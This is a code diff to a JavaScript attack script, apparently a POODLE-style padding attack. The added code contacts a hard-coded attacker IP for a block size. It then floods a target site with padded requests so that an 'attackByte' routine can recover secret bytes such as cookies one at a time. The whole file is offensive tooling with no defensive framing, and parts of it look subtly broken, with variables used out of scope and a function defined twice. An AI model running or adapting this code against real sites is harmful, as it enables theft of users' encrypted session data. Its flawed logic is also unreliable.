@@ -3,6 +3,8 @@ const url = require('url');
 
 var blockSize = null;
 
+const attackerIp = "192.168.0.12"
+
 function sendRequest(method, urlStr, data, callback, errorcallback, timeout) {
     const parsedUrl = url.parse(urlStr);
 
@@ -93,24 +95,29 @@ function sendBlockSizeRequest(attackerIp, targetUrl, options) {
 
 var blockSizeString = ""
 
-//sendRequest('GET', 'http://' + attackerIp + "/blocksize", null, function (response) {
-//    blockSize = parseInt(response.split(' ')[0], 10);
-//    var dataLengthNeeded = parseInt(response.split(' ')[1], 10);
-//
-//    attackByte(dataLengthNeeded + blockSize);
-//}, null, 30000);
-//
-//
-//function sendBlockSizeRequest() {
-//    if (blockSize !== null) return;
-//    blockSizeString += "a"
-//    sendRequest('GET', targetUrl + "/" + blockSizeString, null, sendBlockSizeRequest);
-//}
-//
-//sendBlockSizeRequest();
+sendRequest('GET', 'http://' + attackerIp + "/blocksize", null, function (response) {
+    blockSize = parseInt(response.split(' ')[0], 10);
+    var dataLengthNeeded = parseInt(response.split(' ')[1], 10);
 
-sendRequest('GET', 'https://testdomain.com', null, function (response) {
-    console.log(response)
-}, function (res) {
-    console.log("error");
-}, 30000);
+    attackByte(dataLengthNeeded + blockSize);
+}, null, 30000);
+
+//attackByte(5);
+
+var attackerInterval = setInterval(function () {
+    sendRequest('POST', "https://testdomain.com" + "/", "Coolie", function () {
+        if (done) return;
+        done = true;
+        clearInterval(attackerInterval);
+        attackByte(dataLengthNeeded);
+    });
+}, 100)
+
+
+function sendBlockSizeRequest() {
+    if (blockSize !== null) return;
+    blockSizeString += "a"
+    sendRequest('GET', "https://testdomain.com" + "/" + blockSizeString, null, sendBlockSizeRequest);
+}
+
+sendBlockSizeRequest();
